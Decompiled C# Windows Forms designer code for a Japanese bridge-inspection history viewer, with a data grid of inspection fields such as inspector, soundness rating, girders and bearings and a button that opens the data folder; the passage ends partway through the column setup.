using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Dp6;
using Lb2i;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using i2J7;
using m0DS;
using s4JR;
using z6J9;

namespace Da8s;

[DesignerGenerated]
public class r8HM : Form
{
	[CompilerGenerated]
	internal sealed class Ks2n
	{
		public int _0024VB_0024Local_key;

		public Ks2n(Ks2n arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_key = arg0._0024VB_0024Local_key;
			}
		}
	}

	private IContainer components;

	[field: AccessedThroughProperty("DataGridView1")]
	internal virtual DataGridView DataGridView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("InspectionhistoryBindingSource")]
	internal virtual BindingSource InspectionhistoryBindingSource
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button openDirectoryButton
	{
		[CompilerGenerated]
		get
		{
			return _openDirectoryButton;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = m3L1;
			Button val = _openDirectoryButton;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_openDirectoryButton = value;
			val = _openDirectoryButton;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("UppermaterialDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn UppermaterialDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("SplitContainer1")]
	internal virtual SplitContainer SplitContainer1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("id")]
	internal virtual DataGridViewTextBoxColumn id
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("recorddate")]
	internal virtual DataGridViewTextBoxColumn recorddate
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("inspectionyear")]
	internal virtual DataGridViewTextBoxColumn inspectionyear
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("inspectioner")]
	internal virtual DataGridViewTextBoxColumn inspectioner
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("undercondition")]
	internal virtual DataGridViewTextBoxColumn undercondition
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("alternatepath")]
	internal virtual DataGridViewTextBoxColumn alternatepath
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("generalroad")]
	internal virtual DataGridViewTextBoxColumn generalroad
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("emergencyroad")]
	internal virtual DataGridViewTextBoxColumn emergencyroad
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("occupancy")]
	internal virtual DataGridViewTextBoxColumn occupancy
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("soundness")]
	internal virtual DataGridViewTextBoxColumn soundness
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("uppermaterialmain")]
	internal virtual DataGridViewTextBoxColumn uppermaterialmain
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("uppermaterialside")]
	internal virtual DataGridViewTextBoxColumn uppermaterialside
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("uppermaterialfloor")]
	internal virtual DataGridViewTextBoxColumn uppermaterialfloor
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("undermaterial")]
	internal virtual DataGridViewTextBoxColumn undermaterial
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("bearing")]
	internal virtual DataGridViewTextBoxColumn bearing
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("face")]
	internal virtual DataGridViewTextBoxColumn face
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("datasavedir")]
	internal virtual DataGridViewTextBoxColumn datasavedir
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("IdDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn IdDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RecorddateDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn RecorddateDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RecordprogramDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn RecordprogramDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RecorduseridDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn RecorduseridDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("RecordvalidDataGridViewCheckBoxColumn")]
	internal virtual DataGridViewCheckBoxColumn RecordvalidDataGridViewCheckBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("InspectionyearDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn InspectionyearDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("InspectionerDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn InspectionerDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("UnderconditionDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn UnderconditionDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("AlternatepathDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn AlternatepathDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GeneralroadDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn GeneralroadDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("EmergencyroadDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn EmergencyroadDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("OccupancyDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn OccupancyDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("SoundnessDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn SoundnessDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("UndermaterialDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn UndermaterialDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("BearingDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn BearingDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FaceDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn FaceDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DatasavedirDataGridViewTextBoxColumn")]
	internal virtual DataGridViewTextBoxColumn DatasavedirDataGridViewTextBoxColumn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public r8HM()
	{
		y8J6();
	}

	[DebuggerNonUserCode]
	protected override void Qw5k(bool e3EC)
	{
		try
		{
			if (e3EC && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(e3EC);
		}
	}

	[DebuggerStepThrough]
	private void y8J6()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_0171: Expected O, but got Unknown
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Expected O, but got Unknown
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		//IL_019e: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a8: Expected O, but got Unknown
		//IL_01a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b3: Expected O, but got Unknown
		components = new Container();
		DataGridView1 = new DataGridView();
		InspectionhistoryBindingSource = new BindingSource(components);
		openDirectoryButton = new Button();
		SplitContainer1 = new SplitContainer();
		id = new DataGridViewTextBoxColumn();
		recorddate = new DataGridViewTextBoxColumn();
		inspectionyear = new DataGridViewTextBoxColumn();
		inspectioner = new DataGridViewTextBoxColumn();
		undercondition = new DataGridViewTextBoxColumn();
		alternatepath = new DataGridViewTextBoxColumn();
		generalroad = new DataGridViewTextBoxColumn();
		emergencyroad = new DataGridViewTextBoxColumn();
		occupancy = new DataGridViewTextBoxColumn();
		soundness = new DataGridViewTextBoxColumn();
		uppermaterialmain = new DataGridViewTextBoxColumn();
		uppermaterialside = new DataGridViewTextBoxColumn();
		uppermaterialfloor = new DataGridViewTextBoxColumn();
		undermaterial = new DataGridViewTextBoxColumn();
		bearing = new DataGridViewTextBoxColumn();
		face = new DataGridViewTextBoxColumn();
		datasavedir = new DataGridViewTextBoxColumn();
		IdDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		RecorddateDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		RecordprogramDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		RecorduseridDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		RecordvalidDataGridViewCheckBoxColumn = new DataGridViewCheckBoxColumn();
		InspectionyearDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		InspectionerDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		UnderconditionDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		AlternatepathDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		GeneralroadDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		EmergencyroadDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		OccupancyDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		SoundnessDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		UndermaterialDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		BearingDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		FaceDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		DatasavedirDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
		((ISupportInitialize)DataGridView1).BeginInit();
		((ISupportInitialize)InspectionhistoryBindingSource).BeginInit();
		((ISupportInitialize)SplitContainer1).BeginInit();
		((Control)SplitContainer1.get_Panel1()).SuspendLayout();
		((Control)SplitContainer1.get_Panel2()).SuspendLayout();
		((Control)SplitContainer1).SuspendLayout();
		((Control)this).SuspendLayout();
		DataGridView1.set_AllowUserToAddRows(false);
		DataGridView1.set_AllowUserToDeleteRows(false);
		DataGridView1.set_AutoGenerateColumns(false);
		DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		DataGridView1.get_Columns().AddRange((DataGridViewColumn[])(object)new DataGridViewColumn[34]
		{
			(DataGridViewColumn)id,
			(DataGridViewColumn)recorddate,
			(DataGridViewColumn)inspectionyear,
			(DataGridViewColumn)inspectioner,
			(DataGridViewColumn)undercondition,
			(DataGridViewColumn)alternatepath,
			(DataGridViewColumn)generalroad,
			(DataGridViewColumn)emergencyroad,
			(DataGridViewColumn)occupancy,
			(DataGridViewColumn)soundness,
			(DataGridViewColumn)uppermaterialmain,
			(DataGridViewColumn)uppermaterialside,
			(DataGridViewColumn)uppermaterialfloor,
			(DataGridViewColumn)undermaterial,
			(DataGridViewColumn)bearing,
			(DataGridViewColumn)face,
			(DataGridViewColumn)datasavedir,
			(DataGridViewColumn)IdDataGridViewTextBoxColumn,
			(DataGridViewColumn)RecorddateDataGridViewTextBoxColumn,
			(DataGridViewColumn)RecordprogramDataGridViewTextBoxColumn,
			(DataGridViewColumn)RecorduseridDataGridViewTextBoxColumn,
			(DataGridViewColumn)RecordvalidDataGridViewCheckBoxColumn,
			(DataGridViewColumn)InspectionyearDataGridViewTextBoxColumn,
			(DataGridViewColumn)InspectionerDataGridViewTextBoxColumn,
			(DataGridViewColumn)UnderconditionDataGridViewTextBoxColumn,
			(DataGridViewColumn)AlternatepathDataGridViewTextBoxColumn,
			(DataGridViewColumn)GeneralroadDataGridViewTextBoxColumn,
			(DataGridViewColumn)EmergencyroadDataGridViewTextBoxColumn,
			(DataGridViewColumn)OccupancyDataGridViewTextBoxColumn,
			(DataGridViewColumn)SoundnessDataGridViewTextBoxColumn,
			(DataGridViewColumn)UndermaterialDataGridViewTextBoxColumn,
			(DataGridViewColumn)BearingDataGridViewTextBoxColumn,
			(DataGridViewColumn)FaceDataGridViewTextBoxColumn,
			(DataGridViewColumn)DatasavedirDataGridViewTextBoxColumn
		});
		DataGridView1.set_DataSource((object)InspectionhistoryBindingSource);
		((Control)DataGridView1).set_Dock((DockStyle)5);
		((Control)DataGridView1).set_Location(new Point(0, 0));
		((Control)DataGridView1).set_Name("DataGridView1");
		DataGridView1.set_ReadOnly(true);
		DataGridView1.get_RowTemplate().set_Height(21);
		((Control)DataGridView1).set_Size(new Size(962, 517));
		((Control)DataGridView1).set_TabIndex(0);
		InspectionhistoryBindingSource.set_DataSource((object)typeof(Py5x));
		((Control)openDirectoryButton).set_Location(new Point(12, 6));
		((Control)openDirectoryButton).set_Name("openDirectoryButton");
		((Control)openDirectoryButton).set_Size(new Size(116, 23));
		((Control)openDirectoryButton).set_TabIndex(1);
		((ButtonBase)openDirectoryButton).set_Text("点検データフォルダ");
		((ButtonBase)openDirectoryButton).set_UseVisualStyleBackColor(true);
		SplitContainer1.set_Dock((DockStyle)5);
		SplitContainer1.set_FixedPanel((FixedPanel)1);
		((Control)SplitContainer1).set_Location(new Point(0, 0));
		((Control)SplitContainer1).set_Name("SplitContainer1");
		SplitContainer1.set_Orientation((Orientation)0);
		((Control)SplitContainer1.get_Panel1()).get_Controls().Add((Control)(object)openDirectoryButton);
		((Control)SplitContainer1.get_Panel2()).get_Controls().Add((Control)(object)DataGridView1);
		((Control)SplitContainer1).set_Size(new Size(962, 556));
		SplitContainer1.set_SplitterDistance(35);
		((Control)SplitContainer1).set_TabIndex(2);
		((DataGridViewColumn)id).set_DataPropertyName("id");
		((DataGridViewColumn)id).set_HeaderText("国交省作業番号");
		((DataGridViewColumn)id).set_Name("id");
		((DataGridViewColumn)id).set_ReadOnly(true);
		((DataGridViewColumn)recorddate).set_DataPropertyName("recorddate");
		((DataGridViewColumn)recorddate).set_HeaderText("データ保存日時");
		((DataGridViewColumn)recorddate).set_Name("recorddate");
		((DataGridViewColumn)recorddate).set_ReadOnly(true);
		((DataGridViewColumn)inspectionyear).set_DataPropertyName("inspectionyear");
		((DataGridViewColumn)inspectionyear).set_HeaderText("最新点検年度");
		((DataGridViewColumn)inspectionyear).set_Name("inspectionyear");
		((DataGridViewColumn)inspectionyear).set_ReadOnly(true);
		((DataGridViewColumn)inspectioner).set_DataPropertyName("inspectioner");
		((DataGridViewColumn)inspectioner).set_HeaderText("点検者");
		((DataGridViewColumn)inspectioner).set_Name("inspectioner");
		((DataGridViewColumn)inspectioner).set_ReadOnly(true);
		((DataGridViewColumn)undercondition).set_DataPropertyName("undercondition");
		((DataGridViewColumn)undercondition).set_HeaderText("路下条件");
		((DataGridViewColumn)undercondition).set_Name("undercondition");
		((DataGridViewColumn)undercondition).set_ReadOnly(true);
		((DataGridViewColumn)alternatepath).set_DataPropertyName("alternatepath");
		((DataGridViewColumn)alternatepath).set_HeaderText("代替路有無");
		((DataGridViewColumn)alternatepath).set_Name("alternatepath");
		((DataGridViewColumn)alternatepath).set_ReadOnly(true);
		((DataGridViewColumn)generalroad).set_DataPropertyName("generalroad");
		((DataGridViewColumn)generalroad).set_HeaderText("自専道or一般道");
		((DataGridViewColumn)generalroad).set_Name("generalroad");
		((DataGridViewColumn)generalroad).set_ReadOnly(true);
		((DataGridViewColumn)emergencyroad).set_DataPropertyName("emergencyroad");
		((DataGridViewColumn)emergencyroad).set_HeaderText("緊急輸送道路");
		((DataGridViewColumn)emergencyroad).set_Name("emergencyroad");
		((DataGridViewColumn)emergencyroad).set_ReadOnly(true);
		((DataGridViewColumn)occupancy).set_DataPropertyName("occupancy");
		((DataGridViewColumn)occupancy).set_HeaderText("占用物件（名称）");
		((DataGridViewColumn)occupancy).set_Name("occupancy");
		((DataGridViewColumn)occupancy).set_ReadOnly(true);
		((DataGridViewColumn)soundness).set_DataPropertyName("soundness");
		((DataGridViewColumn)soundness).set_HeaderText("健全度");
		((DataGridViewColumn)soundness).set_Name("soundness");
		((DataGridViewColumn)soundness).set_ReadOnly(true);
		((DataGridViewColumn)uppermaterialmain).set_DataPropertyName("uppermaterialmain");
		((DataGridViewColumn)uppermaterialmain).set_HeaderText("上部工主桁");
		((DataGridViewColumn)uppermaterialmain).set_Name("uppermaterialmain");
		((DataGridViewColumn)uppermaterialmain).set_ReadOnly(true);
		((DataGridViewColumn)uppermaterialside).set_DataPropertyName("uppermaterialside");
		((DataGridViewColumn)uppermaterialside).set_HeaderText("上部工横桁");
		((DataGridViewColumn)uppermaterialside).set_Name("uppermaterialside");
		((DataGridViewColumn)uppermaterialside).set_ReadOnly(true);
		((DataGridViewColumn)uppermaterialfloor).set_DataPropertyName("uppermaterialfloor");
		((DataGridViewColumn)uppermaterialfloor).set_HeaderText("上部工床桁");
		((DataGridViewColumn)uppermaterialfloor).set_Name("uppermaterialfloor");
		((DataGridViewColumn)uppermaterialfloor).set_ReadOnly(true);
		((DataGridViewColumn)undermaterial).set_DataPropertyName("undermaterial");
		((DataGridViewColumn)undermaterial).set_HeaderText("下部工");
		((DataGridViewColumn)undermaterial).set_Name("undermaterial");
		((DataGridViewColumn)undermaterial).set_ReadOnly(true);
		((DataGridViewColumn)bearing).set_DataPropertyName("bearing");
		((DataGridViewColumn)bearing).set_HeaderText("支承");
		((DataGridViewColumn)bearing).set_Name("bearing");
		((DataGridViewColumn)bearing).set_ReadOnly(true);
		((DataGridViewColumn)face).set_DataPropertyName("face");
		((DataGridViewColumn)face).set_HeaderText("橋面");
		((DataGridViewColumn)face).set_Name("face");
		((DataGridViewColumn)face).set_ReadOnly(true);
		((DataGridViewColumn)datasavedir).set_DataPropertyName("datasavedir");
		((DataGridViewColumn)datasavedir).set_HeaderText("データディレクトリ");
		((DataGridViewColumn)datasavedir).set_Name("datasavedir");
		((DataGridViewColumn)datasavedir).set_ReadOnly(true);
		((DataGridViewColumn)IdDataGridViewTextBoxColumn).set_DataPropertyName("id");
		((DataGridViewColumn)IdDataGridViewTextBoxColumn).set_HeaderText("id");
		((DataGridViewColumn)IdDataGridViewTextBoxColumn).set_Name("IdDataGridViewTextBoxColumn");
		((DataGridViewColumn)IdDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)RecorddateDataGridViewTextBoxColumn).set_DataPropertyName("recorddate");
		((DataGridViewColumn)RecorddateDataGridViewTextBoxColumn).set_HeaderText("recorddate");
		((DataGridViewColumn)RecorddateDataGridViewTextBoxColumn).set_Name("RecorddateDataGridViewTextBoxColumn");
		((DataGridViewColumn)RecorddateDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)RecordprogramDataGridViewTextBoxColumn).set_DataPropertyName("recordprogram");
		((DataGridViewColumn)RecordprogramDataGridViewTextBoxColumn).set_HeaderText("recordprogram");
		((DataGridViewColumn)RecordprogramDataGridViewTextBoxColumn).set_Name("RecordprogramDataGridViewTextBoxColumn");
		((DataGridViewColumn)RecordprogramDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)RecorduseridDataGridViewTextBoxColumn).set_DataPropertyName("recorduserid");
		((DataGridViewColumn)RecorduseridDataGridViewTextBoxColumn).set_HeaderText("recorduserid");
		((DataGridViewColumn)RecorduseridDataGridViewTextBoxColumn).set_Name("RecorduseridDataGridViewTextBoxColumn");
		((DataGridViewColumn)RecorduseridDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)RecordvalidDataGridViewCheckBoxColumn).set_DataPropertyName("recordvalid");
		((DataGridViewColumn)RecordvalidDataGridViewCheckBoxColumn).set_HeaderText("recordvalid");
		((DataGridViewColumn)RecordvalidDataGridViewCheckBoxColumn).set_Name("RecordvalidDataGridViewCheckBoxColumn");
		((DataGridViewColumn)RecordvalidDataGridViewCheckBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)InspectionyearDataGridViewTextBoxColumn).set_DataPropertyName("inspectionyear");
		((DataGridViewColumn)InspectionyearDataGridViewTextBoxColumn).set_HeaderText("inspectionyear");
		((DataGridViewColumn)InspectionyearDataGridViewTextBoxColumn).set_Name("InspectionyearDataGridViewTextBoxColumn");
		((DataGridViewColumn)InspectionyearDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)InspectionerDataGridViewTextBoxColumn).set_DataPropertyName("inspectioner");
		((DataGridViewColumn)InspectionerDataGridViewTextBoxColumn).set_HeaderText("inspectioner");
		((DataGridViewColumn)InspectionerDataGridViewTextBoxColumn).set_Name("InspectionerDataGridViewTextBoxColumn");
		((DataGridViewColumn)InspectionerDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)UnderconditionDataGridViewTextBoxColumn).set_DataPropertyName("undercondition");
		((DataGridViewColumn)UnderconditionDataGridViewTextBoxColumn).set_HeaderText("undercondition");
		((DataGridViewColumn)UnderconditionDataGridViewTextBoxColumn).set_Name("UnderconditionDataGridViewTextBoxColumn");
		((DataGridViewColumn)UnderconditionDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)AlternatepathDataGridViewTextBoxColumn).set_DataPropertyName("alternatepath");
		((DataGridViewColumn)AlternatepathDataGridViewTextBoxColumn).set_HeaderText("alternatepath");
		((DataGridViewColumn)AlternatepathDataGridViewTextBoxColumn).set_Name("AlternatepathDataGridViewTextBoxColumn");
		((DataGridViewColumn)AlternatepathDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)GeneralroadDataGridViewTextBoxColumn).set_DataPropertyName("generalroad");
		((DataGridViewColumn)GeneralroadDataGridViewTextBoxColumn).set_HeaderText("generalroad");
		((DataGridViewColumn)GeneralroadDataGridViewTextBoxColumn).set_Name("GeneralroadDataGridViewTextBoxColumn");
		((DataGridViewColumn)GeneralroadDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)EmergencyroadDataGridViewTextBoxColumn).set_DataPropertyName("emergencyroad");
		((DataGridViewColumn)EmergencyroadDataGridViewTextBoxColumn).set_HeaderText("emergencyroad");
		((DataGridViewColumn)EmergencyroadDataGridViewTextBoxColumn).set_Name("EmergencyroadDataGridViewTextBoxColumn");
		((DataGridViewColumn)EmergencyroadDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)OccupancyDataGridViewTextBoxColumn).set_DataPropertyName("occupancy");
		((DataGridViewColumn)OccupancyDataGridViewTextBoxColumn).set_HeaderText("occupancy");
		((DataGridViewColumn)OccupancyDataGridViewTextBoxColumn).set_Name("OccupancyDataGridViewTextBoxColumn");
		((DataGridViewColumn)OccupancyDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)SoundnessDataGridViewTextBoxColumn).set_DataPropertyName("soundness");
		((DataGridViewColumn)SoundnessDataGridViewTextBoxColumn).set_HeaderText("soundness");
		((DataGridViewColumn)SoundnessDataGridViewTextBoxColumn).set_Name("SoundnessDataGridViewTextBoxColumn");
		((DataGridViewColumn)SoundnessDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)UndermaterialDataGridViewTextBoxColumn).set_DataPropertyName("undermaterial");
		((DataGridViewColumn)UndermaterialDataGridViewTextBoxColumn).set_HeaderText("undermaterial");
		((DataGridViewColumn)UndermaterialDataGridViewTextBoxColumn).set_Name("UndermaterialDataGridViewTextBoxColumn");
		((DataGridViewColumn)UndermaterialDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)BearingDataGridViewTextBoxColumn).set_DataPropertyName("bearing");
		((DataGridViewColumn)BearingDataGridViewTextBoxColumn).set_HeaderText("bearing");
		((DataGridViewColumn)BearingDataGridViewTextBoxColumn).set_Name("BearingDataGridViewTextBoxColumn");
		((DataGridViewColumn)BearingDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)FaceDataGridViewTextBoxColumn).set_DataPropertyName("face");
		((DataGridViewColumn)FaceDataGridViewTextBoxColumn).set_HeaderText("face");
		((DataGridViewColumn)FaceDataGridViewTextBoxColumn).set_Name("FaceDataGridViewTextBoxColumn");
		((DataGridViewColumn)FaceDataGridViewTextBoxColumn).set_ReadOnly(true);
		((DataGridViewColumn)DatasavedirDataGridViewTextBoxColumn).set_DataPropertyName("datasavedir");
		((DataGridViewColumn)DatasavedirDataGridViewTextBoxColumn).set_HeaderText("datasavedir");
